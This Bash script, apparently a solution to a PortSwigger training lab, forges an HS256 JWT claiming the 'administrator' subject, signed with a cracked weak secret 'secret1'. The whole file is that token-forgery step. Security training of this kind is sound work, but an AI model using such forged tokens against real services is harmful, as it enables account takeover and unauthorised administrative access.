#!/bin/bash

# =========================

# CONFIGURACIÓN

# =========================

SECRET="secret1"

HEADER='{"kid":"7c3f56df-c2c7-4035-9279-a6c107ca58d4","alg":"HS256"}'
PAYLOAD='{"iss":"portswigger","exp":1773249296,"sub":"administrator"}'

# =========================

# FUNCIÓN BASE64URL

# =========================

base64url() {
openssl base64 -e -A | tr '+/' '-_' | tr -d '='
}

# =========================

# GENERAR HEADER Y PAYLOAD

# =========================

HEADER_B64=$(echo -n "$HEADER" | base64url)

PAYLOAD_COMPACT=$(echo -n "$PAYLOAD" | tr -d '\n ')

PAYLOAD_B64=$(echo -n "$PAYLOAD_COMPACT" | base64url)

DATA="$HEADER_B64.$PAYLOAD_B64"

# =========================

# GENERAR FIRMA

# =========================

SIGNATURE=$(echo -n "$DATA" | openssl dgst -sha256 -hmac "$SECRET" -binary | base64url)

JWT="$DATA.$SIGNATURE"

# =========================

# OUTPUT

# =========================

echo ""
echo "JWT generado:"
echo "$JWT"
echo ""
